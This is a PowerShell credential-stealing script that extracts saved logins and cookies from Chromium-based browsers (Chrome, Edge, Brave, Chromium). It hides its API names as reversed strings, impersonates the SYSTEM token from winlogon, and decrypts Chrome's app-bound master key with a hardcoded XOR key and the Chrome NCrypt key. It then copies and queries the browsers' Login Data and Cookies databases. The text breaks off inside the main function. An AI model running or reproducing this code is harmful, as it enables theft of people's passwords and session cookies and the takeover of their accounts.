try { Add-Type -AssemblyName System.Security } catch {}

function Invoke-FunctionLookup {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [string] $moduleName,

        [Parameter(Position = 1, Mandatory = $true)] 
        [string] $functionName
    )

    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $X1 }).GetType($X2)
    $PtrOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null)

    if ($PtrOverload) {

        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
    }
    else {
        $handleRefOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)

        if (!$handleRefOverload) { throw "Could not find a suitable GetProcAddress overload on this system." }

        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
        return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
    }
}

function Invoke-GetDelegate {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [Type[]] $parameterTypes,

        [Parameter(Position = 1, Mandatory = $false)] 
        [Type] $returnType = [Void]
    )

    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName($N1)),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $moduleBuilder = $assemblyBuilder.DefineDynamicModule($N2, $false)

    $typeBuilder = $moduleBuilder.DefineType(
        $N3, 
        [System.Reflection.TypeAttributes]::Class -bor 
        [System.Reflection.TypeAttributes]::Public -bor 
        [System.Reflection.TypeAttributes]::Sealed -bor 
        [System.Reflection.TypeAttributes]::AnsiClass -bor 
        [System.Reflection.TypeAttributes]::AutoClass, 
        [System.MulticastDelegate]
    )

    $constructorBuilder = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )

    $constructorBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::NewSlot -bor 
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )

    $methodBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    return $typeBuilder.CreateType()
}


$X1 = ([regex]::Matches("lld.metsyS", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X2 = ([regex]::Matches("sdohteMevitaNefasnU.23niW.tfosorciM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X3 = ([regex]::Matches("sserddAcorPteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X4 = ([regex]::Matches("eldnaHeludoMteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

$N1 = ([regex]::Matches("etageleDdetcelfeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$N2 = ([regex]::Matches("eludoMyromeMnI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$N3 = ([regex]::Matches("epyTetageleDyM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

# ======================================================================
# Load Library Function
# ======================================================================
$LoadLibraryADelegate = Invoke-GetDelegate -ParameterTypes @([string]) -ReturnType ([IntPtr])
$LoadLibraryAFunctionPointer = Invoke-FunctionLookup -ModuleName "kernel32.dll" -FunctionName "LoadLibraryA"

$LoadLibraryA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $LoadLibraryAFunctionPointer,
    $LoadLibraryADelegate
)

# ======================================================================
# Winsqlite3.dll Function Pointers
# ======================================================================

$LibraryHandle = $LoadLibraryA.Invoke("winsqlite3.dll")

if ($LibraryHandle -eq [IntPtr]::Zero) {
    return "[-] Failed to load winsqlite3.dll"
}

$Sqlite3OpenV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_open_v2'),
    (Invoke-GetDelegate @([string], [IntPtr].MakeByRefType(), [int], [IntPtr]) ([int])))

$Sqlite3Close = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_close'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

$Sqlite3PrepareV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_prepare_v2'),
    (Invoke-GetDelegate @([IntPtr], [string], [int], [IntPtr].MakeByRefType(), [IntPtr]) ([int])))

$Sqlite3Step = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_step'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

$Sqlite3ColumnText = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_text'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))

$Sqlite3ColumnBlob = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_blob'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))

$Sqlite3ColumnByte = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_bytes'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([int])))

$Sqlite3ErrMsg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_errmsg'),
    (Invoke-GetDelegate @([IntPtr]) ([IntPtr])))

$Sqlite3Finalize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_finalize'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))


# ======================================================================
# Token Handling Function Pointers
# ======================================================================

$OpenProcessFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Kernel32.dll' -FunctionName 'OpenProcess'),
    (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))

$OpenProcessTokenFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'OpenProcessToken'),
    (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([bool])))

$DuplicateTokenExFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'DuplicateTokenEx'),
    (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([bool])))

$ImpersonateLoggedOnUserFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'ImpersonateLoggedOnUser'),
    (Invoke-GetDelegate @([IntPtr]) ([bool])))


# ======================================================================
# Simple P/Invoke (Advapi32)
# ======================================================================

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
}
"@


# ======================================================================
# NCrypt.dll Function Pointers
# ======================================================================

$LibraryHandle = $LoadLibraryA.Invoke("ncrypt.dll")

if ($LibraryHandle -eq [IntPtr]::Zero) {
    return "[-] Failed to load ncrypt.dll"
}


$NCryptOpenStorageProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenStorageProvider'),
    (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [int]) ([int])))

$NCryptOpenKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenKey'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [int]) ([int])))

$NCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptDecrypt'),
    (Invoke-GetDelegate @([IntPtr], [byte[]], [int], [IntPtr], [byte[]], [int], [Int32].MakeByRefType(), [uint32]) ([int])))

$NCryptFreeObjectFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptFreeObject'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))


# ======================================================================
# Kernel32.dll Function Pointers
# ======================================================================

$CloseHandleFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'kernel32.dll' -FunctionName 'CloseHandle'),
    (Invoke-GetDelegate @([IntPtr]) ([bool])))
    
# ======================================================================
# BCrypt.dll Function Pointers
# ======================================================================

$LibraryHandle = $LoadLibraryA.Invoke("bcrypt.dll")

if ($LibraryHandle -eq [IntPtr]::Zero) {
    return "[-] Failed to load bcrypt.dll"
}

$BCryptOpenAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptOpenAlgorithmProvider'),
    (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [int]) ([int])))

$BCryptSetPropertyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptSetProperty'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr], [int], [int]) ([int])))

$BCryptGenerateSymmetricKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptGenerateSymmetricKey'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [byte[]], [int], [int]) ([int])))

$BCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDecrypt'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [int], [IntPtr], [IntPtr], [int], [IntPtr], [int], [Int32].MakeByRefType(), [int]) ([int])))

$BCryptDestroyKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDestroyKey'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

$BCryptCloseAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptCloseAlgorithmProvider'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([int])))

# ======================================================================
# Main script functions
# ======================================================================

function Log {
    param([string]$Message)
    if ($Script:VerboseMode) { Write-Output "[*] $Message" }
}

function LogHex {
    param([string]$Label, [byte[]]$Bytes)
    if ($Script:VerboseMode) {
        $Hex = if ($Bytes) { [BitConverter]::ToString($Bytes) } else { "<null>" }
        Write-Output "$Label : $Hex"
    }
}

# ======================================================================
# Invoke-Impersonate
# ======================================================================
function Invoke-Impersonate {

    $ProcessHandle          = [IntPtr]::Zero
    $TokenHandle            = [IntPtr]::Zero
    $DuplicateTokenHandle   = [IntPtr]::Zero

    $CurrentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    if ($CurrentSid -eq 'S-1-5-18') { return $true }

    $WinlogonProcessId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
    $ProcessHandle = $OpenProcessFunction.Invoke(0x400, $true, [int]$WinlogonProcessId)
    if ($ProcessHandle -eq [IntPtr]::Zero) { return $false }

    $TokenHandle = [IntPtr]::Zero
    if (-not $OpenProcessTokenFunction.Invoke($ProcessHandle, 0x0E, [ref]$TokenHandle)) { return $false }

    $DuplicateTokenHandle = [IntPtr]::Zero
    if (-not $DuplicateTokenExFunction.Invoke($TokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$DuplicateTokenHandle)) {
        return $false
    }

    try {
        if (-not $ImpersonateLoggedOnUserFunction.Invoke($DuplicateTokenHandle)) { return $false }

        $NewSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        return ($NewSid -eq 'S-1-5-18')
    }
    catch {
        return $false
    }
    finally {
        if ($DuplicateTokenHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($DuplicateTokenHandle) }
        if ($TokenHandle          -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($TokenHandle)          } 
        if ($ProcessHandle        -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($ProcessHandle)        }
    }
}

# ======================================================================
# Parse-ChromeKeyBlob
# ======================================================================
function Parse-ChromeKeyBlob {
    param([byte[]]$BlobData)

    $CurrentOffset = 0
    $HeaderLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
    $CurrentOffset += 4
    $HeaderBytes = $BlobData[$CurrentOffset..($CurrentOffset + $HeaderLength - 1)]
    $CurrentOffset += $HeaderLength
    $ContentLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
    $CurrentOffset += 4
    $EncryptionFlag = $BlobData[$CurrentOffset]
    $CurrentOffset += 1

    $ParseResult = @{
        Header          = $HeaderBytes
        Flag            = $EncryptionFlag
        Iv              = $null
        Ciphertext      = $null  
        Tag             = $null
        EncryptedAesKey = $null
    }

    if ($EncryptionFlag -eq 1 -or $EncryptionFlag -eq 2) {
        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
        $CurrentOffset += 12
        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)] 
        $CurrentOffset += 32
        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
    }
    elseif ($EncryptionFlag -eq 3) {
        $ParseResult.EncryptedAesKey = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
        $CurrentOffset += 32
        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
        $CurrentOffset += 12
        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
        $CurrentOffset += 32  
        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
    }
    return New-Object PSObject -Property $ParseResult
}

# ======================================================================
# DecryptWithAesGcm
# ======================================================================
function DecryptWithAesGcm {
    param([byte[]]$Key, [byte[]]$Iv, [byte[]]$Ciphertext, [byte[]]$Tag)

    $AlgorithmHandle = [IntPtr]::Zero
    $KeyHandle       = [IntPtr]::Zero

    try {
        $AlgorithmIdPointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("AES")
        $BCryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgorithmIdPointer, [IntPtr]::Zero, 0) | Out-Null
        [Runtime.InteropServices.Marshal]::FreeHGlobal($AlgorithmIdPointer)

        $PropertyNamePointer    = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingMode")
        $PropertyValuePointer   = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingModeGCM")
        $BCryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropertyNamePointer, $PropertyValuePointer, 32, 0) | Out-Null
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyNamePointer)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyValuePointer)

        $BCryptGenerateSymmetricKeyFunction.Invoke($AlgorithmHandle, [ref]$KeyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0) | Out-Null

        $IvPointer          = [Runtime.InteropServices.Marshal]::AllocHGlobal($Iv.Length)
        $CiphertextPointer  = [Runtime.InteropServices.Marshal]::AllocHGlobal($Ciphertext.Length)
        $TagPointer         = [Runtime.InteropServices.Marshal]::AllocHGlobal($Tag.Length)
        $PlaintextPointer   = [Runtime.InteropServices.Marshal]::AllocHGlobal($Ciphertext.Length)

        [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $IvPointer, $Iv.Length)
        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CiphertextPointer, $Ciphertext.Length)
        [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $TagPointer, $Tag.Length)

        $AuthInfoSize = 96
        $AuthInfoPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($AuthInfoSize)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 0, $AuthInfoSize)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 4, 1)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 8, $IvPointer.ToInt64())
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 16, $Iv.Length)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 24, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 32, 0)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 40, $TagPointer.ToInt64())
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 48, $Tag.Length)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 56, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 64, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 68, 0)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 72, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 80, 0)

        [int]$ResultLength = 0
        $BCryptDecryptFunction.Invoke($KeyHandle, $CiphertextPointer, $Ciphertext.Length, $AuthInfoPointer, [IntPtr]::Zero, 0, $PlaintextPointer, $Ciphertext.Length, [ref]$ResultLength, 0) | Out-Null

        $PlaintextBytes = New-Object byte[] $ResultLength
        [Runtime.InteropServices.Marshal]::Copy($PlaintextPointer, $PlaintextBytes, 0, $ResultLength)
        return $PlaintextBytes
    }
    finally {
        if ($AuthInfoPointer)   { [Runtime.InteropServices.Marshal]::FreeHGlobal($AuthInfoPointer)   }
        if ($PlaintextPointer)  { [Runtime.InteropServices.Marshal]::FreeHGlobal($PlaintextPointer)  }
        if ($CiphertextPointer) { [Runtime.InteropServices.Marshal]::FreeHGlobal($CiphertextPointer) }
        if ($TagPointer)        { [Runtime.InteropServices.Marshal]::FreeHGlobal($TagPointer)        }
        if ($IvPointer)         { [Runtime.InteropServices.Marshal]::FreeHGlobal($IvPointer)         }
        if ($KeyHandle -ne [IntPtr]::Zero)          { [void]$BCryptDestroyKeyFunction.Invoke($KeyHandle) }
        if ($AlgorithmHandle -ne [IntPtr]::Zero)    { [void]$BCryptCloseAlgorithmProviderFunction.Invoke($AlgorithmHandle, 0) }
    }
}

# ======================================================================
# DecryptWithNCrypt
# ======================================================================
function DecryptWithNCrypt {
    param([byte[]]$InputData)

    try {
        $ProviderName = "Microsoft Software Key Storage Provider"
        $KeyName = "Google Chromekey1"
        $NcryptSilentFlag = 0x40
        $ProviderHandle = [IntPtr]::Zero
        $KeyHandle = [IntPtr]::Zero

        $ProviderNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
        $NCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProviderNamePointer, 0) | Out-Null
        [Runtime.InteropServices.Marshal]::FreeHGlobal($ProviderNamePointer)

        $KeyNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
        $NCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyNamePointer, 0, 0) | Out-Null
        [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyNamePointer)

        $OutputSize = 0
        $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $null, 0, [ref]$OutputSize, $NcryptSilentFlag) | Out-Null

        $OutputBytes = New-Object byte[] $OutputSize
        $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $OutputBytes, $OutputBytes.Length, [ref]$OutputSize, $NcryptSilentFlag) | Out-Null

        return $OutputBytes
    }
    finally {
        if ($KeyHandle -ne [IntPtr]::Zero) { [void]$NCryptFreeObjectFunction.Invoke($KeyHandle) }
        if ($ProviderHandle -ne [IntPtr]::Zero) { [void]$NCryptFreeObjectFunction.Invoke($ProviderHandle) }
    }
}

function HexToBytes {
    param([string]$HexString)
    $ByteArray = New-Object byte[] ($HexString.Length / 2)
    for ($Index = 0; $Index -lt $ByteArray.Length; $Index++) {
        $ByteArray[$Index] = [System.Convert]::ToByte($HexString.Substring($Index * 2, 2), 16)
    }
    return $ByteArray
}

function XorBytes {
    param([byte[]]$FirstArray, [byte[]]$SecondArray)
    $ResultArray = New-Object byte[] $FirstArray.Length
    for ($Index = 0; $Index -lt $FirstArray.Length; $Index++) {
        $ResultArray[$Index] = $FirstArray[$Index] -bxor $SecondArray[$Index]
    }
    return $ResultArray
}

function Decrypt-ChromeKeyBlob {
    param($ParsedData)
    if ($ParsedData.Flag -eq 3) {
        [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
        Invoke-Impersonate > $null
        try {
            $DecryptedAesKey = DecryptWithNCrypt -InputData $ParsedData.EncryptedAesKey
            if (-not $DecryptedAesKey) { return $null }
            $XoredAesKey = XorBytes -FirstArray $DecryptedAesKey -SecondArray $XorKey
            return DecryptWithAesGcm -Key $XoredAesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
        }
        finally { [void][Advapi32]::RevertToSelf() }
    }
    return $null
}

# ======================================================================
# DATA COLLECTION HELPERS
# ======================================================================

function Get-ChromiumLoginBlobs {
    param([string]$ProfilePath)
    $LoginDataPath = Join-Path $ProfilePath "Login Data"
    if (-not (Test-Path $LoginDataPath)) { return @() }

    $TempDb = Join-Path $env:TEMP ("LoginData_{0}.db" -f ([guid]::NewGuid()))
    try {
        Copy-Item -Path $LoginDataPath -Destination $TempDb -Force -ErrorAction SilentlyContinue
    } catch { return @() }

    $DbHandle = [IntPtr]::Zero
    if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbHandle, 1, [IntPtr]::Zero) -ne 0) { return @() }

    $Stmt = [IntPtr]::Zero
    if ($Sqlite3PrepareV2.Invoke($DbHandle, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$Stmt, [IntPtr]::Zero) -ne 0) {
        $Sqlite3Close.Invoke($DbHandle) | Out-Null
        return @()
    }

    $Results = @()
    while ($Sqlite3Step.Invoke($Stmt) -eq 100) {
        $UrlPtr = $Sqlite3ColumnText.Invoke($Stmt, 0)
        $UserPtr = $Sqlite3ColumnText.Invoke($Stmt, 1)
        $PassPtr = $Sqlite3ColumnBlob.Invoke($Stmt, 2)
        $PassSize = $Sqlite3ColumnByte.Invoke($Stmt, 2)

        if ($PassSize -gt 0) {
            $PassBytes = New-Object byte[] $PassSize
            [Runtime.InteropServices.Marshal]::Copy($PassPtr, $PassBytes, 0, $PassSize)
            $Results += [PSCustomObject]@{
                URL      = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UrlPtr)
                Username = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UserPtr)
                RawBlob  = $PassBytes
            }
        }
    }
    $Sqlite3Finalize.Invoke($Stmt) | Out-Null
    $Sqlite3Close.Invoke($DbHandle) | Out-Null
    Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
    return $Results
}

function Get-ChromiumCookieBlobs {
    param([string]$ProfilePath)
    $PossiblePaths = @((Join-Path $ProfilePath "Network\Cookies"), (Join-Path $ProfilePath "Cookies"))
    $CookiePath = $null
    foreach ($P in $PossiblePaths) { if (Test-Path $P) { $CookiePath = $P; break } }
    if (-not $CookiePath) { return @() }

    $TempDb = Join-Path $env:TEMP ("Cookies_{0}.db" -f ([guid]::NewGuid()))
    try {
        Copy-Item -Path $CookiePath -Destination $TempDb -Force -ErrorAction SilentlyContinue
    } catch { return @() }

    $DbHandle = [IntPtr]::Zero
    if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbHandle, 1, [IntPtr]::Zero) -ne 0) { return @() }

    $Stmt = [IntPtr]::Zero
    if ($Sqlite3PrepareV2.Invoke($DbHandle, "SELECT host_key, name, path, encrypted_value FROM cookies", -1, [ref]$Stmt, [IntPtr]::Zero) -ne 0) {
        $Sqlite3Close.Invoke($DbHandle) | Out-Null
        return @()
    }

    $Results = @()
    while ($Sqlite3Step.Invoke($Stmt) -eq 100) {
        $HostPtr = $Sqlite3ColumnText.Invoke($Stmt, 0)
        $NamePtr = $Sqlite3ColumnText.Invoke($Stmt, 1)
        $PathPtr = $Sqlite3ColumnText.Invoke($Stmt, 2)
        $ValPtr = $Sqlite3ColumnBlob.Invoke($Stmt, 3)
        $ValSize = $Sqlite3ColumnByte.Invoke($Stmt, 3)

        if ($ValSize -gt 0) {
            $ValBytes = New-Object byte[] $ValSize
            [Runtime.InteropServices.Marshal]::Copy($ValPtr, $ValBytes, 0, $ValSize)
            $Results += [PSCustomObject]@{
                Host    = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($HostPtr)
                Name    = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
                Path    = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($PathPtr)
                RawBlob = $ValBytes
            }
        }
    }
    $Sqlite3Finalize.Invoke($Stmt) | Out-Null
    $Sqlite3Close.Invoke($DbHandle) | Out-Null
    Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
    return $Results
}

# ======================================================================
# Invoke-PowerChrome (Main Function)
# ======================================================================

function Invoke-PowerChrome {
    param ([string]$Browser, [switch]$Verbose)
    $Script:VerboseMode = $Verbose

    $AppData = $env:LOCALAPPDATA
    $UserDataPath = switch ($Browser.ToLower()) {
        "chrome"    { Join-Path $AppData "Google\Chrome\User Data" }
        "edge"      { Join-Path $AppData "Microsoft\Edge\User Data" }
        "brave"     { Join-Path $AppData "BraveSoftware\Brave-Browser\User Data" }
        "chromium"  { Join-Path $AppData "Chromium\User Data" }
        "cft"       { Join-Path $AppData "Google\Chrome for Testing\User Data" }
        default { return $null }
    }

    if (-not (Test-Path $UserDataPath)) { return $null }

    # 1. Decrypt Master Key
    Log "Resolving Master Key..."
    $LocalStatePath = Join-Path $UserDataPath "Local State"
    if (-not (Test-Path $LocalStatePath)) { return $null }

    $MasterKey = $null
    try {
        $Json = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
        if ($Json.os_crypt.encrypted_key) {
            $EncKey = [Convert]::FromBase64String($Json.os_crypt.encrypted_key)
            $EncKey = $EncKey[5..($EncKey.Length - 1)]
            $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, 0)
        } elseif ($Json.os_crypt.app_bound_encrypted_key) {
            $AppBound = [Convert]::FromBase64String($Json.os_crypt.app_bound_encrypted_key)
            $EncKeyBlob = $AppBound[4..($AppBound.Length - 1)]
            Invoke-Impersonate > $null
            $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, 0)
            [void][Advapi32]::RevertToSelf()
            $Second = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, 0)
            $Parsed = Parse-ChromeKeyBlob -BlobData $Second
            $MasterKey = Decrypt-ChromeKeyBlob -ParsedData $Parsed
        }
    } catch { Log "Key decryption failed: $($_.Exception.Message)" }

    if (-not $MasterKey) { Log "Could not obtain Master Key."; return $null }

    # 2. Iterate Profiles
    $Profiles = Get-ChildItem $UserDataPath -Directory | Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile *" }
    $AllLogins = @()
    $AllCookies = @()

    foreach ($P in $Profiles) {
        Log "Processing profile: $($P.Name)"
        $RawLogins = Get-ChromiumLoginBlobs -ProfilePath $P.FullName
        $RawCookies = Get-ChromiumCookieBlobs -ProfilePath $P.FullName

        # Decrypt Logins
        foreach ($L in $RawLogins) {
            try {
                $Raw = $L.RawBlob
                $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
